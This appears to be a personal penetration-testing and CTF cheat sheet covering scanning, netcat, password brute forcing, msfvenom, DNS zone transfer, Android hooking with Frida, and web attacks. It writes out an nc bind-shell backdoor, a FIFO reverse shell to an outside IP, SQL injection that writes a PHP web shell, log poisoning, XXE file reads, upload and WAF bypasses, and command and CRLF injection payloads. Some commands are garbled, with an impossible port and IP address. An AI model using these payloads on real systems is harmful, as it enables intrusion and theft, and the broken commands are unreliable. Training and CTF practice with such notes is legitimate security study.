 **Table of content:**
 - [Scanning](#scan)
 - [Listening](#listen)
 - [Sharing](#share)
 - [Webapp](#web)
 - [Cracking](#crack)
 - [payload generation](#payload)
 - [DNS](#dns)
 - [Searching](#search)
 - [Object Analysis](#file)
 - [Other](#misc)

**Advanced:**
 - [Android](#android)
 - [Web](#web)
 - [Reverse Engineering and Binary Analysis](#binary)


<a id="scan"></a>
## Scanning
```bash
nmap -sC -sV -p- 10.0.2.5 -oA init-scan1
```
slow but reliable
```bash
sudo nmap -Pn -p- -A -T4 -oN scan.txt <target_ip>
```
faster but target may drop so adjust min-rate
```bash
sudo nmap -Pn -p- -A --min-rate 5000 -oN scan.txt <target_ip>
```
UDP scan
```bash
sudo nmap -Pn -sU --top-ports 500 -A -T4 -oN udp-scan.txt <target_ip>
```
port scanning with `NAT`
```bash
nat -z 1-1000 -vvv
```

<a id="listen"></a>
## Server Communication
### NC
- nc can work with any protocol. we just need a server and client to send commands
- nc 192.16.1.1 8000 --vv
- connect to port
```bash
nc -nv <target-ip> <target-port>
```
- HTTP 
```bash
get / HTTP/1.1
HEAD / HTTP/1.1
```
- simple backddor
  ```bash
  nc -lp 8080 -e /bin/bash
  ```
  - in CTFs we should set a unique port for ourself to connect to it
- Sending file
  ```bash
  nc client 90000 < myFile.txt 
  ```
  and on server
  ```bash
  nc -lvp 90000 > myFile.txt
  ```
- Creating reverse shell using Linux `FIFO` files: writes on one side and read from other side. we tell `nc` to put on this file and then send it from other side to victim.
  ```bash
  rm tmp/fifo
  mkfifo /tmp/fifo
  cat /tmp/fifo | /bin/sh -i 2>&1 | nc 102.2123.412.41 99 > /tmp/fifo
  ```


<a id="share"></a>
## Sharing
```bash
ftp anonymous@10.10.100.44
```
list shares. `-N` means passwordless
```bash
smbclient -N -L //10.10.100.44
```



<a id="web"></a>
## Web application enumeration
Directory bruteforce
```bash 
gobuster dir -e -u http://10.0.2.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php -o gobuster-scan
```
```bash
dirb http://10.0.2.239 -r -o dirbuster-scan
```
Fuzzing Url
```bash 
ffuf -u http://10.0.2.5/blog-post/archives/randylogs.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirb/small.txt -fs 0
```
Automatic Vulnerability scanner
```bash 
nkito -host https://
```
Sending requests
```bash
curl -I HEAD http://mysite.com
curl -X POST http://mysite.com -H "Authorization: Bearer token" -D "{ 'data': 'something' }"
```

<a id="crack"></a>
## Crack and Bruteforce
Crack Zip
```bash
fcrackzip -D -p /user/share/wordlists/rockyou.txt user_backup.zip
```
SSH password bruteforce (you can use 'ssh' instead of '22') (available lists in Kali: `/usr/share/rockyu
`)
```bash
hydra -l target -P /rockyu 192.168.8.100 22 -vV 
```
using Ncrack
```bash
ncrack --user target -P /rockyu ssh://192.9 -vv
```

<a id="payload"></a>
## Payloads
Payload with msfvenom
```bash 
msfvenom --list payloads
```
```bash 
msfvenom -p payloadname --list-options
```
```bash
msfvenom -p payloadname LHOST="" LPORT="" -f python -b "\x00\x0a\0d"
```


<a id="shell"></a>
## Reverseshell
	


<a id="dns"></a>
## DNS 
Get all dns servers for a domain
```bash
dig +short ns zonetransfer.me
```
Get copy of zone from dns server
```bash
dig axfr zonetransfer.me @nsztm1.digi.ninja.
```
DNS zone transfer. "mysite.test" is the certificate name that target is using
```bash
host -l mysite.test 10.10.100.44
```


<a id="search"></a>
## Searching
```bash
find . -user userX -group groupY | cat 		===> show path
find . -user userX -group groupY | xargs cat	===> show content
```
otherusefull `ls` options: `-perm/4000`

otherusefull `ls`, `find` options: `--color`

Search strings inside files
```bash
grep -rli './' -e 'search_string'
```
### AWK 
`awk` is a text processing language: Begin ....... end
```bash
ls -l | awk 'Begin{s=0} {s=s+$5} END{print s}'
```

<a id="edit"></a>
## Editing
### Sed
- search and replacesed: `'s/eng/abc/' myFile`
- search and append: `sed 's/M/&b/' myFile`
- delete line 5,6: `sed '5,6 d' myFile`


<a id="file"></a>
## File and object analysis
binwalk: embedded inside exe and other file types
```bash
binwalk -D "png image:png" fidf.jpg
```
exiftool: meta information

objdump: copy important Info from a file like its assembler or execution code in assembly
```bash
objdump -D file.bin
```
```bash
strings -a
```
hexdump of a file
```bash
xxd
```
stat of a file
```bash
stat 
```

<a id="misc"></a>
## Misc
Copy to clipboard
```bash
cat my-ctf-password.txt | xclip
```
Executing python code on command line
```bash
python -c 
```
Password-less ssh:
	1- `ssh-keygen` : private/public generator key for ssh
	2- send it to `.ssh/authorized_keys` into ssh servers.
	3- now we can ssh as any users into server!


<a id="android"></a>
# Android
- Application-based permissions
- `Broadcast Receiver`, `Activity`, `Content Provider`, `Intent`, `Service`: background process
- `APK` installation in android architectures: `AndroidRunTime`, `Delvik`
- `Frida` (Server -client) **dynamic** android analysis. use it for calling functions that you want anywhere

  frida server:**x86.64** vs **ARM**

  frida client: pip

  Frida is like a Hook that can bypass: **SSL pinning**, **root detection**, **encryption**, **emulation detection**, ....

  **WARN**: Android 8 or 7(not so much newer). The device should be rooted.
  
  Frida allows us to inject JS code into processes, where your js gets executed with full access to memory, hooking functions and even calling native functions inside the process. There is a bi-directional communication channel that is used to talk between your app and the JS running inside the target process.

  - usefull commands:
    `frida-ps -U`: Zygot process and others...

    ```bash
    adb push frida data/local/temp
    ```
    ```bash
    adb shell
    ```
   Show all system logs
   ```bash
   logcat | grep 1171
   ```

  Frida allows to run JS codes inside native apps(Windows,mac,lin,android). and we can also call C functions. It is like a debugger

  In static analysis, if you need to change something, you should change it in `smali` file and then compile it. but in Frida, it is much easier and no need to recompile and just use js scripts.

  We can use it to identify informations that may be hidden inside memory that they are not easy to identify when the developer use `Obfusction`. We can use `frida` to run automate tasks: Brute forcing, fuzzing.

  It is better to run Frida on Jailbreaked (rooted) devices but it can be run `unrooted` devices using Frida `gadets`(refer to Github page)

  How to reverse using Frida?
   - identify problems and the goal and how Frida will help us
	  - decompile app using `JadX` or ...
	  - find and analyze methods that we gonna modify and hook
	  - manipulate app to desired behaviour using **JS**

  `Objection` is a tool for bypassing **SSL pinning** that is based on Frida.

  Running frida:
  ```bash
  frida -U -l .\Desktop\frida.js -f jakhar.aseem.diva
   ```
   ```
   %resume
   ```

- `APKTools`(APK easytool APKtool GUI) and `JadxGUI` for **static** analysis (decompilation any app written in any language to **JAVA**).

  You need Java for `Jadx`

  If `JadX` can not convert to Java, use `APKtools` to convert to `Smali`.

  In some APKs, we may have more than one `classes.dex`.

  You can not protect your APK from decompilation.
  

- Java and Smali + (Js for Frida for writing scripts)
- We can use `strings` command on APK file.
- **Hardcode** means the things that can not be obfuscated. (eg: keys, urls, special strings,...)
- shared preferences, each application has this folder and each application has an space in `/data/data`.
  application's data may be stored in `/sdcard`
  ```bash
  sqllite3 db.db
  ```
- Intents
 - Create and Start directly an `intent` Action: `#am start -a jakhar.aseem.diva.action.VIEW_CREDS`
 - Intent with extra:
 	```bash
  	am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2 --ez check_pin false
  	```

<a id="web"></a>
# Web
- chat[]
- sessions
- logout
- find mail by account reset password
- input length
- on error
- stored xss
- run js inside HTML ==> `javascript:alert(1)`
- xss in comments area, search area
- WAF : checks user's reuqest before sending it to server : 
- Swiss Army payload that also included SQL injection:
  - https://github.com/swisskyrepo/PayloadsAllTheThings

2)sql comments: --+ 
				%23 ==> url_encode
load_file(/etc/passwd)
load_file(0x91839219) : hexadecimal
#UNION SELECT 1,'<?php system($_GET[c]); ?>',3,4,5,6,7,8,9 into outfile '/app/shell.php'
then get the file : #load_file('/app/shell.php') . then you will get a shell and you can use it like this : shell.php?c=ls
information_schema -> metadata 

            select SCHEMA_NAME from information_schema.SCHEMATA : show all databases


            Illegal mix of collations for operation 'UNION' -> 


            1 -> convert(SCHEMA_NAME+using+latin1)
            2 -> hex(SCHEMA_NAME)
            3 -> hex(group_concat(SCHEMA_NAME))

                information_schema,test,performance_schema,sys,mysql

		get all table name :		
			UNION SELECT table_name from information_schema.tables
			UNION SELECT table_name from information_schema.tables where TABLE_SCHEMA = database()  
			UNION SELECT table_name from information_schema.tables where TABLE_SCHEMA=database() limit 0,1
			UNION SELECT table_name from information_schema.tables where TABLE_SCHEMA=database() limit 1,1
			UNION SELECT table_name from information_schema.tables where TABLE_SCHEMA=database() limit 2,1
			UNION SELECT table_name from information_schema.tables where TABLE_SCHEMA=database() limit 3,1
			UNION SELECT table_name from information_schema.tables where TABLE_SCHEMA=database() limit 4,1

3) SQLMap methods for inject code:
	UNION
		for sql server, the column's types of two tables should also be same.
		how to found number of columns? # order by 3 or Group by 3
		UNION SELECT 1,2,3,4
	Blind Boolean
	Blind Time
	Double Query
	XPath

	python3 sqlmap.py -u "http://meisamrce.ir:2101/?id=1"

    python3 sqlmap.py -u "http://meisamrce.ir:2101/?id=1" --dbs
    python3 sqlmap.py -u "http://meisamrce.ir:2101/?id=1" -D test --tables
    python3 sqlmap.py -u "http://meisamrce.ir:2101/?id=1" -D test -T users --columns 
    python3 sqlmap.py -u "http://meisamrce.ir:2101/?id=1" -D test -T users --dump	
	--os-shell
	We can also send the packet data in Burp by -r switch ( It is useful, when our request have special headers and tokens)




    ' or 1=1 #


IN local path Traversal, it is not important how many times we put "../".
Maybe the page's content-type is set to image. so in that case we can check page source or use burp suite
Double encode
file_put_contents(name,content) : create a file in php
file_get_contents
//
<?php @system($_GET[c]);?>
Do not forget to use URL encode to bypass WAF. or to put special characters like '+'
include_once bypass when it adds an extension to end of file:
	localhost:2411/?page=http://meisamrce.ir/test.gif?&c=ls
	localhost:2411/?page=http://meisamrce.ir/test.gif%23&c=ls : we can also use # instead of ?  
	2) Second way is just creating a php file yourself
bypass WAF:
	ununionion 
    http://meisamrce.ir:2414/?page=hthttptp://meisamrce.ir
How to know target's web server? #curl -I site.com: just returns the response header

Access log: in apache, based on the request response's status, it will be logged in two files:
	access log : 

                        200 : 

                        curl http://meisamrce.ir:2415/ -H "User-Agent: salam" -> access.log 
                        curl http://meisamrce.ir:2415/ -H "User-Agent: <?php system($_GET[c]);die; ?>" -> access.log 
                

    error log :    

php file wrapper: meisamrce.ir:2416/?page=:///etc/passwd
stegnoraphy: put php code inside gif/jpg files exiftool -> gif 
        jpg -> metadata - commnet -> code php 

 Unrestricted File Upload: 
                        1 -> black list -> html - js - php 
                                php7 
                                php5
                                pHp            
                        2 - .htaccess (php handler)
								first we upload a file name .htaccess that includes this line:
                                	AddType application/x-httpd-php .test 
								then we can upload a "1.test" file that server will execute it as a PHP file.
								If it doesn't worked, check for other handler codes.
                        3 -> Content-Type -> image/png -> mime type
                        4 -> 
                                test.png.php
                                test.php.png
XML External Entity(XEE) : Some apps can parse XML. XML is being used for data transfer.
				- to check that if a site has XEE, we can upload below coded and if it outputs "meisam", it means that the site is vulnerable to XEE (We create an entity in below):
                <!DOCTYPE replace [<!ENTITY example  "meisam"> ]>
                <root>
                        <test>&example;</test>
                </root>

				- use system-defined entities:
                <!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
                <root>
                        <test>&example;</test>
                </root>

				- 
                <!DOCTYPE replace [<!ENTITY example SYSTEM "file:///usr/src/app/app.py"> ]>
                <root>
                        <test>&example;</test>
                </root>


                
SSRF : Server Side Request Forgery
	            http://meisamrce.ir:5050 
                http://meisamrce.ir:110
                http://meisamrce.ir:3306
                http://meisamrce.ir:9090


                http://0:5001
                IP to Hex convertor: http://0x7f.00.00.01:5001



SSTI (Server Side Template Injection): 
	- Template build engines that parse the specific format files and run eval on them to build a page.
	- Every template engine that gets the user input and build a file from that, is vulnerable.
	- payloads:
		{{2*2}}
	
Whenever some of our inputs reflects and appear in page, you can use it as XSS.
html entities, CSP, SOP
how the browser knows the CSP?
	1) in HTML code in Meta target
	2) response's header from server. and it will be applied to all pages of website.
- convert IP to decimal
- php execute bash code: exec("find / >a.txt")
- create a new file: /bin/bash#>a
- "\r\n" is used in HTTP request/response messages 
- We can inject in some of HTTP request header's fields.
- HTTP response code:
	1xx: Info --> eg protocol switching
	2xx
	3xx: redirect
	4xx: 
	5xx
- HTTP response headers:
	X-Frame-Options: 
	Content-Security-Policy: The specific resources/assets can be loaded from a specifc domain or location.
	X-Content-Type-Options: prevents MIME type sniffing. the hacker won't be able to put a js code inside a simple text file
-Curl http://www.google.com:
	-v: full request response packet show
	-I: just head. returns head 
	-i: same as -I but also show response
	-X POST, HEAD: just head
	-o t.html
- Verb tampering attack
- #curl http://1.12.13.13 -H "Host:ali.inode.ir" : (Virtual Host)different 
subdomains under one IP
- Sending data along requests:
	#curl https:// -d "area:100" : pOST request
- if Http-only is set to false for a cookie, cookie can be accessed by JS. Secure should also be set to true, so the cookie can be transport through HTTPS. SameSite can be set to 'NONE'
- Curl: use it for query website 
- send an array as input and see the reaction.
- Command Injection:
	cmd1 ; cmd2
  	cmd1 && cmd2
  	cmd1 || cmd2
	- Comments:
		# in bash and rem in windows
- curl http://192.168.1.1 -d "$(cat index.php)" : runs this command and shows outputs
- curl http://192.168.1.1 -d @myfile.php : display this files
- convert to hexadecimal: echo AABBCCDD | od -A n -t x1 | sed 's/ *//g' : we can also use #xxd -p and "s/\s//g" for removing spaces
- labrotary: http://meisamrce.ir:8090/
- There is tools to automate command injection.( check payload all things)
- CRLF injection:
	\r ==> dec:13 - hex:0d ==> CR
	\n ==> dec:10 - hex:0a ==> LF
	usefull payload:
		127.0.0.1%0dls%23
		127.0.0.1%0als%23
		127.0.0.1%0d%0dls%23
		127.0.0.1%0a%0dls%23
- In almost any programming language, we have a method called eval that executes a user input: eg. eval("print(2+2);")
- character limit in input field. solutions ===>
	- try reading from a url param
	- use a file
	....
- How to move a file that is in /tmp folder of server to our computer==> use php file upload.
	#curl http://meisam..rc -F "f=@test.txt"
- XSS:
	CSRF + XSS ==> XSRF
	Browser Object Model(BOM)==> location,window,... and Document Object Model(DOM)
	payloads: view page source 
		test">
first-party: *.mydomain.com
third-party: otherdomain.com
- CSRF:	xhr simple request with "with_credential=true";
	Samesite attribute when we set cookie. It determine how we can transfer cookie between two sites:
		LAX: Default - the cookies only will be send in GET request for third party.
		Strict: No transfer for third parties.
		NONE: coookie transfer in any request.the site should be https and SECURE flage should be set to true.
	Same Origin Policy(SOP): we can not load resources(fonts,http packets,...) from a thirdparty site in our domain. but there is exceptions: <img>,<video>, <script>
	simple request: GET,POST,HEAD but no response	
	preflight request: How we can achieve response from third party sites if we need? ===> CORS
		any request other than simple request, and then the browser notfies and sends an OPTION request(no body) to the destination site with this fiedls:
			OPTION request:
			ACCESS-CONTROL-REQUEST-METHOD: PUT
		 	ACCESS-CONTROL-REQUEST-HEADERS: X-TOKEN
		 	response from server:
			ORIGIN: http://ali.ir
		 	ACCESS-CONTROL-ALLOW-ORIGIN: http://foo.bar.org
		 	ACCESS-CONTROL-ALLOW-METHODS: POST, GET, OPTIONS, DELETE







